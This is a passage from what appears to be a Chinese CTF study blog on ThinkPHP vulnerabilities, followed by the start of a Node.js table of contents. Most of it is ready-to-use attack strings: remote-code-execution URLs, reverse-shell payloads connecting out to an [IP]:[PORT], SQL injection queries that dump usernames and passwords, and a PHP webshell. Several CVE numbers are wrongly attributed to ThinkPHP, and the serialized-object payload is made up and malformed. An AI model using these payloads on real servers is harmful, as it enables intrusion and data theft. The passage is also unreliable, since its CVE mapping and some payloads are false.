或者其他方法确保路径合法，避免路径遍历攻击。</p></li><li><p><strong>反序列化防御</strong>：尽量避免反序列化用户提供的数据。如果必须使用反序列化，确保对数据进行严格校验，并限制可以被序列化的类。</p></li></ol><hr><h3 id="版本历史与漏洞总结"><a href="#版本历史与漏洞总结" class="headerlink" title="版本历史与漏洞总结"></a>版本历史与漏洞总结</h3><p><strong>ThinkPHP 5.x 漏洞历史</strong>：</p><ul><li><strong>CVE-2018-20062</strong>：该漏洞允许通过 URL 调用任意函数，导致远程代码执行。</li><li><strong>CVE-2019-9082</strong>：此漏洞存在于 ThinkPHP 5.x 系列，通过路径构造可以实现远程代码执行。</li></ul><p><strong>ThinkPHP 3.x 漏洞历史</strong>：</p><ul><li><strong>路径遍历漏洞</strong>：攻击</li></ul><p>者可以通过不安全的路径输入读取系统敏感文件。</p><ul><li><strong>反序列化漏洞</strong>：未安全处理反序列化数据，可能导致远程代码执行。</li></ul><hr><h3 id="CTF-题目中的-ThinkPHP-漏洞总结"><a href="#CTF-题目中的-ThinkPHP-漏洞总结" class="headerlink" title="CTF 题目中的 ThinkPHP 漏洞总结"></a>CTF 题目中的 ThinkPHP 漏洞总结</h3><p>在 CTF 中，常见的 ThinkPHP 相关题目漏洞有以下几类：</p><ol><li><strong>SQL 注入</strong>：利用不安全的 SQL 查询进行注入操作。</li><li><strong>远程代码执行</strong>：通过构造特殊的 URL 或输入执行系统命令。</li><li><strong>路径遍历</strong>：通过不当的文件路径处理读取服务器上的敏感文件。</li><li><strong>反序列化漏洞</strong>：利用反序列化机制实现任意代码执行。</li></ol><p>掌握这些攻击技巧和防御措施，可以帮助 CTF 选手在比赛中快速识别并利用 ThinkPHP 漏洞。</p><hr><h2 id="1-CVE-2018-20062-ThinkPHP-远程代码执行漏洞"><a href="#1-CVE-2018-20062-ThinkPHP-远程代码执行漏洞" class="headerlink" title="1. CVE-2018-20062 - ThinkPHP 远程代码执行漏洞"></a>1. <strong>CVE-2018-20062</strong> - ThinkPHP 远程代码执行漏洞</h2><h3 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h3><p><strong>CVE-2018-20062</strong> 是 ThinkPHP 5.x 系列中一个远程代码执行漏洞。该漏洞利用了框架中对 URL 参数的处理不当，允许攻击者通过构造恶意的 URL 调用 PHP 内置函数，最终实现代码执行。</p><h3 id="受影响版本：-1"><a href="#受影响版本：-1" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 5.0.23 及其之前版本</li><li>ThinkPHP 5.1.31 及其之前版本</li></ul><h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>ThinkPHP 在路由处理时，允许 URL 中的函数和参数直接调用系统函数，导致攻击者可以通过构造恶意的 URL 来调用任意函数并执行系统命令。</p><h3 id="漏洞利用的-URL-格式："><a href="#漏洞利用的-URL-格式：" class="headerlink" title="漏洞利用的 URL 格式："></a>漏洞利用的 URL 格式：</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-params">[函数名]</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=参数1&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=参数2...</span><br></code></pre></td></tr></table></figure><h3 id="利用-Payload-示例："><a href="#利用-Payload-示例：" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="执行-phpinfo-函数："><a href="#执行-phpinfo-函数：" class="headerlink" title="执行 phpinfo() 函数："></a>执行 <code>phpinfo()</code> 函数：</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<br></code></pre></td></tr></table></figure><h4 id="执行系统命令-whoami："><a href="#执行系统命令-whoami：" class="headerlink" title="执行系统命令 whoami："></a>执行系统命令 <code>whoami</code>：</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br></code></pre></td></tr></table></figure><h4 id="执行-id-命令获取用户权限："><a href="#执行-id-命令获取用户权限：" class="headerlink" title="执行 id 命令获取用户权限："></a>执行 <code>id</code> 命令获取用户权限：</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br></code></pre></td></tr></table></figure><h4 id="执行反向-Shell-命令："><a href="#执行反向-Shell-命令：" class="headerlink" title="执行反向 Shell 命令："></a>执行反向 Shell 命令：</h4><p>如果服务器允许外部网络访问，可以使用以下 Payload 触发反向 Shell：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=<span class="hljs-title">bash</span>+-<span class="hljs-title">c</span>+&#x27;<span class="hljs-title">bash</span>+-<span class="hljs-title">i</span>+&gt;&amp;+/<span class="hljs-title">dev</span>/<span class="hljs-title">tcp</span>/<span class="hljs-params">[IP]</span>/<span class="hljs-params">[PORT]</span>+0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-CVE-2019-9082-ThinkPHP-远程代码执行漏洞"><a href="#2-CVE-2019-9082-ThinkPHP-远程代码执行漏洞" class="headerlink" title="2. CVE-2019-9082 - ThinkPHP 远程代码执行漏洞"></a>2. <strong>CVE-2019-9082</strong> - ThinkPHP 远程代码执行漏洞</h2><h3 id="背景：-1"><a href="#背景：-1" class="headerlink" title="背景："></a>背景：</h3><p><strong>CVE-2019-9082</strong> 是 ThinkPHP 5.x 中另一个远程代码执行漏洞。此漏洞发生在处理 URL 时，攻击者可以构造恶意的 URL 通过框架执行任意的系统命令。</p><h3 id="受影响版本：-2"><a href="#受影响版本：-2" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 5.0.23 及其之前版本</li><li>ThinkPHP 5.1.31 及其之前版本</li></ul><h3 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>类似于 <strong>CVE-2018-20062</strong>，该漏洞允许攻击者在 URL 中调用 PHP 内置函数，最终实现代码执行。</p><h3 id="利用-Payload-示例：-1"><a href="#利用-Payload-示例：-1" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="执行-phpinfo-函数：-1"><a href="#执行-phpinfo-函数：-1" class="headerlink" title="执行 phpinfo() 函数："></a>执行 <code>phpinfo()</code> 函数：</h4><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">name</span>/<span class="hljs-comment">&#123;@phpinfo()&#125;</span><br></code></pre></td></tr></table></figure><h4 id="执行系统命令-whoami：-1"><a href="#执行系统命令-whoami：-1" class="headerlink" title="执行系统命令 whoami："></a>执行系统命令 <code>whoami</code>：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="获取文件列表（执行-ls-命令）："><a href="#获取文件列表（执行-ls-命令）：" class="headerlink" title="获取文件列表（执行 ls 命令）："></a>获取文件列表（执行 <code>ls</code> 命令）：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">bash<br>复制代码<br><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="执行反向-Shell："><a href="#执行反向-Shell：" class="headerlink" title="执行反向 Shell："></a>执行反向 Shell：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="3-CVE-2018-19518-ThinkPHP-反序列化远程代码执行漏洞"><a href="#3-CVE-2018-19518-ThinkPHP-反序列化远程代码执行漏洞" class="headerlink" title="3. CVE-2018-19518 - ThinkPHP 反序列化远程代码执行漏洞"></a>3. <strong>CVE-2018-19518</strong> - ThinkPHP 反序列化远程代码执行漏洞</h2><h3 id="背景：-2"><a href="#背景：-2" class="headerlink" title="背景："></a>背景：</h3><p>该漏洞是 ThinkPHP 5.x 系列中的一个反序列化漏洞。攻击者可以通过精心构造的反序列化数据传递恶意对象，导致远程代码执行。</p><h3 id="受影响版本：-3"><a href="#受影响版本：-3" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 5.x 系列</li></ul><h3 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>PHP 中的序列化与反序列化操作如果处理不当，会导致攻击者通过构造恶意序列化数据进行对象注入。ThinkPHP 在某些功能中使用了不安全的反序列化操作，导致可以利用恶意序列化对象实现代码执行。</p><h3 id="利用-Payload-示例：-2"><a href="#利用-Payload-示例：-2" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="恶意序列化数据："><a href="#恶意序列化数据：" class="headerlink" title="恶意序列化数据："></a>恶意序列化数据：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ThinkPHP&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>该序列化对象中的 <code>exec</code> 字段会被执行，从而调用 <code>phpinfo()</code> 函数。</p><h4 id="执行系统命令-whoami：-2"><a href="#执行系统命令-whoami：-2" class="headerlink" title="执行系统命令 whoami："></a>执行系统命令 <code>whoami</code>：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ThinkPHP&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;whoami&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="4-CVE-2018-1000861-ThinkPHP-模板注入漏洞"><a href="#4-CVE-2018-1000861-ThinkPHP-模板注入漏洞" class="headerlink" title="4. CVE-2018-1000861 - ThinkPHP 模板注入漏洞"></a>4. <strong>CVE-2018-1000861</strong> - ThinkPHP 模板注入漏洞</h2><h3 id="背景：-3"><a href="#背景：-3" class="headerlink" title="背景："></a>背景：</h3><p>模板注入漏洞允许攻击者通过不当的输入插入并执行任意的 PHP 代码。此漏洞发生在开发者未正确过滤用户输入的情况下，导致攻击者可以通过模板引擎执行恶意代码。</p><h3 id="受影响版本：-4"><a href="#受影响版本：-4" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 3.x 和 5.x 系列</li></ul><h3 id="利用-Payload-示例：-3"><a href="#利用-Payload-示例：-3" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="通过模板注入执行-phpinfo-："><a href="#通过模板注入执行-phpinfo-：" class="headerlink" title="通过模板注入执行 phpinfo()："></a>通过模板注入执行 <code>phpinfo()</code>：</h4><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">name</span>/<span class="hljs-comment">&#123;@phpinfo()&#125;</span><br></code></pre></td></tr></table></figure><h4 id="通过模板注入执行系统命令-whoami："><a href="#通过模板注入执行系统命令-whoami：" class="headerlink" title="通过模板注入执行系统命令 whoami："></a>通过模板注入执行系统命令 <code>whoami</code>：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="获取文件列表（执行-ls-命令）：-1"><a href="#获取文件列表（执行-ls-命令）：-1" class="headerlink" title="获取文件列表（执行 ls 命令）："></a>获取文件列表（执行 <code>ls</code> 命令）：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="5-CVE-2019-8018-ThinkPHP-SQL-注入漏洞"><a href="#5-CVE-2019-8018-ThinkPHP-SQL-注入漏洞" class="headerlink" title="5. CVE-2019-8018 - ThinkPHP SQL 注入漏洞"></a>5. <strong>CVE-2019-8018</strong> - ThinkPHP SQL 注入漏洞</h2><h3 id="背景：-4"><a href="#背景：-4" class="headerlink" title="背景："></a>背景：</h3><p>此漏洞存在于 ThinkPHP 中的 SQL 查询处理部分，攻击者可以通过注入恶意的 SQL 查询操控数据库。在某些场景下，未正确过滤或使用不安全的查询方式，导致攻击者通过拼接 SQL 语句进行注入。</p><h3 id="受影响版本：-5"><a href="#受影响版本：-5" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 3.x 系列</li></ul><h3 id="利用-Payload-示例：-4"><a href="#利用-Payload-示例：-4" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="获取数据库所有用户信息："><a href="#获取数据库所有用户信息：" class="headerlink" title="获取数据库所有用户信息："></a>获取数据库所有用户信息：</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT username, password <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>--<br></code></pre></td></tr></table></figure><h4 id="利用-UNION-SELECT-获取数据库版本："><a href="#利用-UNION-SELECT-获取数据库版本：" class="headerlink" title="利用 UNION SELECT 获取数据库版本："></a>利用 <code>UNION SELECT</code> 获取数据库版本：</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">index.php?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; UNION SELECT <span class="hljs-built_in">version</span>(), <span class="hljs-number">1</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h4 id="查询所有表名："><a href="#查询所有表名：" class="headerlink" title="查询所有表名："></a>查询所有表名：</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT table_name <span class="hljs-keyword">FROM</span> information_schema.tables WHERE <span class="hljs-attribute">table_schema</span>=database() --<br></code></pre></td></tr></table></figure><h4 id="获取指定表的字段名："><a href="#获取指定表的字段名：" class="headerlink" title="获取指定表的字段名："></a>获取指定表的字段名：</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT column_name <span class="hljs-keyword">FROM</span> information_schema.columns WHERE <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> --<br></code></pre></td></tr></table></figure><hr><h2 id="6-CVE-2019-7481-ThinkPHP-后台文件上传漏洞"><a href="#6-CVE-2019-7481-ThinkPHP-后台文件上传漏洞" class="headerlink" title="6. CVE-2019-7481 - ThinkPHP 后台文件上传漏洞"></a>6. <strong>CVE-2019-7481</strong> - ThinkPHP 后台文件上传漏洞</h2><h3 id="背景：-5"><a href="#背景：-5" class="headerlink" title="背景："></a>背景：</h3><p>此漏洞涉及到 ThinkPHP 文件上传功能的处理不当。攻击者可以上传恶意的 PHP 文件，绕过文件类型检查，直接在服务器上执行任意 PHP 代码。</p><h3 id="受影响版本：-6"><a href="#受影响版本：-6" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 5.x 系列</li></ul><h3 id="漏洞原理：-3"><a href="#漏洞原理：-3" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>文件上传功能未能正确校验上传文件的后缀名或 MIME 类型，允许攻击者上传恶意 PHP 文件并直接访问该文件。</p><h3 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a>利用步骤：</h3><ol><li>上传包含 PHP 代码的 WebShell，如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol><li>访问上传的 PHP 文件并执行命令：</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/uploads/</span>shell.php?cmd=whoami<br></code></pre></td></tr></table></figure><h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><h2 id="目录-3"><a href="#目录-3" class="headerlink" title="目录"></a>目录</h2><h2 id="1-Node-js-基础"><a href="#1-Node-js-基础" class="headerlink" title="1. Node.js 基础"></a>1. Node.js 基础</h2><ul><li><a href="#11-%E4%BB%80%E4%B9%88%E6%98%AF-nodejs">1.1 什么是 Node.js</a></li><li><a href="#12-nodejs-%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE">1.2 Node.js 安装与配置</a></li><li><a href="#13-nodejs-%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6%E4%B8%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF">1.3 Node.js 运行机制与事件循环</a></li><li><a href="#14-nodejs-%E4%B8%8E-javascript-%E7%9A%84%E5%8C%BA%E5%88%AB">1.4 Node.js 与 JavaScript 的区别</a></li></ul><h2 id="2-模块与包管理"><a href="#2-模块与包管理" class="headerlink" title="2. 模块与包管理"></a>2. 模块与包管理</h2><ul><li><p><a href="#21-nodejs-%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97">2.1 Node.js 内置模块</a></p><ul><li><a href="#211-fs-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9D%97">2.1.1 <code>fs</code> 文件系统模块</a></li><li><a href="#212-http-%E6%A8%A1%E5%9D%97">2.1.2 <code>http</code> 模块</a></li><li><a href="#213-path-%E6%A8%A1%E5%9D%97">2.1.3 <code>path</code> 模块</a></li><li><a href="#214-os-%E6%A8%A1%E5%9D%97">2.1.4 <code>os</code> 模块</a></li><li><a href="#215-crypto-%E6%A8%A1%E5%9D%97">2.1.5 <code>crypto</code> 模块</a></li></ul></li><li><p><a href="#22-%E4%BD%BF%E7%94%A8-npm-%E5%92%8C%E5%8C%85%E7%AE%A1%E7%90%86">2.2 使用 NPM 和包管理</a></p><ul><li><a href="#221-npm-%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8">2.2.1 NPM 的安装和使用</a></li><li><a href="#222-%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96">2.2.2 管理项目依赖</a></li><li><a href="#223-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E4%B8%8E%E8%AF%AD%E4%B9%89%E5%8C%96%E7%89%88%E6%9C%AC">2.2.3 版本控制与语义化版本</a></li><li><a href="#224-%E4%BD%BF%E7%94%A8-packagejson-%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE">2.2.4 使用 <code>package.json</code> 管理项目</a></li></ul></li><li><p><a href="#23-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97%E4%B8%8E-commonjs-%E8%A7%84%E8%8C%83">2.3 自定义模块与 CommonJS 规范</a></p><ul><li><a href="#231-%E5%AF%BC%E5%85%A5%E4%B8%8E%E5%AF%BC%E5%87%BA%E6%A8%A1%E5%9D%97">2.3.1 导入与导出模块</a></li><li><a href="#232-commonjs-%E5%92%8C-es6-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB">2.3.2 CommonJS 和 ES6 模块的区别</a></li></ul></li></ul><h2 id="3-异步编程"><a href="#3-异步编程" class="headerlink" title="3. 异步编程"></a>3. 异步编程</h2><ul><li><p><a href="#31-%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80">3.1 异步编程基础</a></p><ul><li><a href="#311-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0">3.1.1 回调函数</a></li><li><a href="#312-promise-%E5%AF%B9%E8%B1%A1">3.1.2 <code>Promise</code> 对象</a></li><li><a href="#313-asyncawait-%E8%AF%AD%E6%B3%95">3.1.3 <code>async/await</code> 语法</a></li></ul></li><li><p><a href="#32-%E4%BA%8B%E4%BB%B6%E9%A9%B1%E5%8A%A8%E7%BC%96%E7%A8%8B">3.2 事件驱动编程</a></p><ul><li><a href="#321-%E4%BD%BF%E7%94%A8-eventemitter">3.2.1 使用 <code>EventEmitter</code></a></li><li><a href="#322-%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86">3.2.2 自定义事件处理</a></li></ul></li><li><p><a href="#33-%E5%BC%82%E6%AD%A5%E6%8E%A7%E5%88%B6%E6%B5%81%E7%AE%A1%E7%90%86">3.3 异步控制流管理</a></p><ul><li><a href="#331-asyncjs-%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8">3.3.1 <code>async.js</code> 库的使用</a></li><li><a href="#332-%E5%BC%82%E6%AD%A5%E9%98%9F%E5%88%97%E4%B8%8E%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6">3.3.2 异步队列与并发控制</a></li></ul></li></ul><h2 id="4-文件操作与-I-O"><a href="#4-文件操作与-I-O" class="headerlink" title="4. 文件操作与 I&#x2F;O"></a>4. 文件操作与 I&#x2F;O</h2><ul><li><p><a href="#41-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C">4.1 文件系统操作</a></p><ul><li><a href="#411-%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6">4.1.1 读取与写入文件</a></li><li><a href="#412-%E6%96%87%E4%BB%B6%E6%B5%81%E4%B8%8E%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">4.1.2 文件流与大文件处理</a></li></ul></li><li><p><a href="#42-%E7%BD%91%E7%BB%9C-io-%E6%93%8D%E4%BD%9C">4.2 网络 I&#x2F;O 操作</a></p><ul><li><a href="#421-%E5%88%9B%E5%BB%BA-http-%E6%9C%8D%E5%8A%A1%E5%99%A8">4.2.1 创建 HTTP 服务器</a></li><li><a href="#422-%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94">4.2.2 处理请求与响应</a></li><li><a href="#423-%E4%BD%BF%E7%94%A8-https-%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1">4.2.3 使用 <code>https</code> 模块进行安全通信</a></li></ul></li></ul><h2 id="5-数据库与存储"><a href="#5-数据库与存储" class="headerlink" title="5. 数据库与存储"></a>5. 数据库与存储</h2><ul><li><p><a href="#51-%E4%BD%BF%E7%94%A8-mongodb">5.1 使用 MongoDB</a></p><ul><li><a href="#511-%E8%BF%9E%E6%8E%A5%E5%88%B0-mongodb">5.1.1 连接到 MongoDB</a></li><li><a href="#512-crud-%E6%93%8D%E4%BD%9C">5.1.2 CRUD 操作</a></li><li><a href="#513-%E4%BD%BF%E7%94%A8-mongoose-%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1">5.1.3 使用 Mongoose 进行数据建模</a></li></ul></li><li><p><a href="#52-%E4%BD%BF%E7%94%A8-mysql">5.2 使用 MySQL</a></p><ul><li><a href="#521-%E8%BF%9E%E6%8E%A5%E5%88%B0-mysql">5.2.1 连接到 MySQL</a></li><li><a href="#522-%E6%89%A7%E8%A1%8C-sql-%E6%9F%A5%E8%AF%A2">5.2.2 执行 SQL 查询</a></li><li><a href="#523-%E4%BD%BF%E7%94%A8-sequelize-%E8%BF%9B%E8%A1%8C-orm-%E6%98%A0%E5%B0%84">5.2.3 使用 <code>sequelize</code> 进行 ORM 映射</a></li></ul></li></ul><h2 id="6-Web-开发与框架"><a href="#6-Web-开发与框架" class="headerlink" title="6. Web 开发与框架"></a>6. Web 开发与框架</h2><ul><li><p><a href="#61-%E4%BD%BF%E7%94%A8-express-%E6%A1%86%E6%9E%B6">6.1 使用 Express 框架</a></p><ul><li><a href="#611-%E5%88%9B%E5%BB%BA%E5%9F%BA%E6%9C%AC%E7%9A%84-express-%E5%BA%94%E7%94%A8">6.1.1 创建基本的 Express 应用</a></li><li><a href="#612-%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6">6.1.2 路由与中间件</a></li><li><a href="#613-%E5%A4%84%E7%90%86%E8%A1%A8%E5%8D%95%E5%92%8C-json-%E6%95%B0%E6%8D%AE">6.1.3 处理表单和 JSON 数据</a></li><li><a href="#614-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">6.1.4 错误处理</a></li></ul></li><li><p><a href="#62-%E4%BD%BF%E7%94%A8-koa-%E6%A1%86%E6%9E%B6">6.2 使用 Koa 框架</a></p><ul><li><a href="#621-koa-%E7%9A%84%E7%89%B9%E7%82%B9%E4%B8%8E-express-%E5%AF%B9%E6%AF%94">6.2.1 Koa 的特点与 Express 对比</a></li><li><a href="#622-%E5%88%9B%E5%BB%BA-koa-%E5%BA%94%E7%94%A8">6.2.2 创建 Koa 应用</a></li><li><a href="#623-%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%B8%8E%E8%B7%AF%E7%94%B1%E5%A4%84%E7%90%86">6.2.3 中间件与路由处理</a></li></ul></li><li><p><a href="#63-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E">6.3 模板引擎</a></p><ul><li><a href="#631-%E4%BD%BF%E7%94%A8-ejs">6.3.1 使用 EJS</a></li><li><a href="#632-%E4%BD%BF%E7%94%A8-handlebars">6.3.2 使用 Handlebars</a></li><li><a href="#633-%E4%BD%BF%E7%94%A8-pug">6.3.3 使用 Pug</a></li></ul></li></ul><h2 id="7-测试与调试"><a href="#7-测试与调试" class="headerlink" 